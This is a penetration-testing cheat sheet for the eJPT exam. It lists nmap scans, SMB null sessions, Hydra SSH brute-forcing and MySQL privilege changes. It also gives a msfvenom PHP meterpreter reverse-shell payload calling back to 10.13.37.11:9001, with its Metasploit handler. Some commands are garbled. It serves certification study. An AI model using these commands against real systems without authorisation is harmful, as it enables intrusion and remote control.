# EJPT cheat sheet

# Networking

## Check routing table information

```
route
ip route
```

## Add a network to current route

```
route add -net 192.168.10.0 netmask 255.255.255.0 gw 10.175.3.1
```

## Adding Manual Routes

```
ip route add <subnet> via <gateway or router address>
```

for example,

```
ip route add 192.168.222.0/24 via 10.172.24.1       # Here 10.172.24.1 is the address of the gateway for subnet 192.168.222.0/24
```

[Checking Routes & Adding Manual Routes](etc/Checking%20Routes%20&%20Adding%20Manual%20Routes%2040433226a9eb4d559e38224118e8ce7a.md)

## DNS

```
nslookup mysite.com
dig mysite.com
```

## Checking Routes

```
ip route    # Checking defined routes in linux
route       # Checking defined routes in linux
route print     # Checking defined routes in windows
```

# Nmap

## My general scan

```html
nmap -sV sC -T4 <ip> -oN out.nmap
```

## Discover Live Hosts on the Network

```
sudo nmap -sN 172.16.64.0/24
fping -a -g 172.16.64.0/24 2>/dev/null
```

## Discover Ip's using fping

```bash
fping -a -g 172.16.64.0/24 2>/dev/null
```

## Scan all the IPs at same time using file

```
nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open
```

## Spotting a Firewall

If an nmap TCP scan identified a well-known service, such as a web server, but cannot detect the version, then there may be a firewall in place.

For example:

```
PORT    STATE  SERVICE  REASON          VERSION
80/tcp  open   http?    syn-ack ttl 64
```

Another example:

```
80/tcp  open   tcpwrapped
```

**“tcpwrapped”** means the TCP handshake was completed, but the remote host closed the connection without receiving any data.

These are both indicators that a firewall is blocking our scan with the target!

Tips: - Use “–reason” to see why a port is marked open or closed - If a “RST” packet is received, then something prevented the connection - probably a firewall!

# Web Server Fingerprinting

### HTTP

```
nc -v www.abc.com 80        # After pressing enter you are prompted to send some dataType two lines given below and press enter two times to get http responseGET / HTTP/1.1Host: www.abc.com
```

### HTTPs

```
openssl s_client -connect hack.me 443       # Establish ssl connection
```

## Gobuster scan - for http password protected ones

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://172.16.64.140/project/backup -U admin -P admin
```

## Subdomain Enumeration

- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [DNSdumpster](https://dnsdumpster.com/)

# Finding MAC Addresses



```
ipconfig /all       # windows
ifconfig        # *nix OSs
ip addr     # linux
```

# Checking ARP Cache



```
arp -a      # Windows
arp     # *nix OSs
ip neighbour        # Linux
```

# Checking for Listening Ports on a Host



```
netstat -ano        # Windows
netstat -tunp       # linux
```

# SMB Enumeration



[139,445 - Pentesting SMB](https://book.hacktricks.xyz/pentesting/pentesting-smb)

## enum4linux

```
enum4linux -a <ip>      # Enumerating using enum4linux tool
```

## smbclient

```
smbclient -L //IP -N    # Checking for available sharessmbclient //<target IP>/IPC$ -N     # Connecting to a share
```

## nmap scripts

```
nmap -p445 --script=smb-vuln-* <IP> -v      # This will run all the smb-vuln scripts, if you want to run only few scripts then you can check other available scripts in /usr/share/nmap/scripts
```

## SMB Null Attack

Try to login without a username or password:

```
$ smbclient //ip/share -N
```

# MySQL

Login to MySQL with password

```
$ mysql --user=root --port=13306 -p -h 172.16.64.81
```

```
> SHOW databases;
> SHOW tables FROM databases;
> USE database;
> SELECT * FROM table;
```

Change table entry values

```
# Add the user tracking1 to the "adm" group
> update users set adm="yes" where username="tracking1";
```

# Metasploit stuff

## Metepreter reverse tcp ( msfvenom )

```html
msfvenom -p php/meterpreter_reverse_tcp lhost=10.13.37.11 lport=9001 -o msf.php
```

## Get rshell using msf multi handler

```html
use exploit/multi/handler
set lhost 10.13.37.11
set payload php/meterpreter_reverse_tcp
set lport 9001
run
```

## Port foward using metapreter

```html
portfwd add -l 2222 -p 22 -r 172.16.50.222
```

# Some tools

## John-The-Ripper

```bash
john -wordlist=<wordlist> <file to crack>
```

## Hydra

```bash
hydra -l <username> -P <path to wordlist> <IP> ssh
```

```bash
hydra -L <path to username wordlist> -P <path to password wordlist> <IP> ssh
```

## Wire-shark only get requests

```
http.request.method == GET / POST
```

# if got stuck here's some resources

[eJPT-Cheatsheet/eJPT Cheatsheet.md at main · atinfosec/eJPT-Cheatsheet](https://github.com/atinfosec/eJPT-Cheatsheet/blob/main/eJPT%20Cheatsheet.md)

[refabr1k's Pentest Notebook](https://refabr1k.gitbook.io/oscp/)

[HackTricks](https://book.hacktricks.xyz/)

[https://www.notion.so/CTF-2021-67649903f2f24e41b3625f69390b3be5](https://www.notion.so/CTF-2021-67649903f2f24e41b3625f69390b3be5)